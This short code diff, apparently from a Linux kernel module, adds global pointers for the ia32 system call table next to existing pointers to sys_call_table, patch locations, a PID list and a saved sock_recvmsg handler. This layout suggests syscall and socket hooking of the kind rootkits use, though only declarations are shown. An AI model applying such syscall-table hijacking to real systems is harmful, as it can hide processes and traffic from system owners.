@@ -75,10 +75,13 @@ struct pid_list_node *pid_list_find(pid_t nr);
 /*
  * Global variables.
  */
+void **my_ia32sct;
 void **my_sct;
 void **sys_call_table;
+void **ia32_sys_call_table;
 unsigned int *psct_fastpath;
 unsigned int *psct_slowpath;
+unsigned int *pia32sct;
 struct pid_list_node *pid_list_head;
 struct pid_list_node *pid_list_tail;
 int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
